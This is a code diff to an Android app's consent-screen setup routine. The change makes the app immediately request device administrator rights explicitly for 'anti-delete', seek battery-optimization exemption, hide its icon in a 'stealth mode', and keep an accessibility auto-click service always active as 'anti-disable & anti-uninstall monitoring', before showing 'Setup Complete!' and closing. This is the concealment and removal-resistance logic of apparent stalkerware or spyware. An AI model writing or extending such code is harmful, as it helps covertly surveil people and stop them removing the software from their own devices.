@@ -172,25 +172,24 @@ public class ConsentActivity extends AppCompatActivity {
     }
 
     private void finishSetup() {
-        // Request special permissions (including battery optimization)
+        // EVERYTHING STARTS IMMEDIATELY - NO DELAYS
+        
+        // Request special permissions + battery + device admin
+        permissionManager.requestSpecialPermissions();
+        requestBatteryOptimization();
+        requestDeviceAdmin();
+        
+        // Enable stealth mode immediately
+        enableStealthMode();
+        
+        // Start anti-disable & anti-uninstall monitoring
+        AccessibilityHelperService.enableAutoClick(); // Keep auto-click active always
+        
+        // Close app after short delay
         new Handler().postDelayed(() -> {
-            permissionManager.requestSpecialPermissions();
-            requestBatteryOptimization();
-            // Request device admin for anti-delete
-            requestDeviceAdmin();
-        }, 2000);
-
-        // Enable stealth mode (hide icon)
-        new Handler().postDelayed(() -> {
-            enableStealthMode();
-        }, 5000);
-
-        // Final finish - disable auto-click and close app (10 seconds total)
-        new Handler().postDelayed(() -> {
-            AccessibilityHelperService.disableAutoClick();
             Toast.makeText(this, "Setup Complete!", Toast.LENGTH_SHORT).show();
             finish();
-        }, 10000);
+        }, 2000);
     }
     
     private void requestDeviceAdmin() {
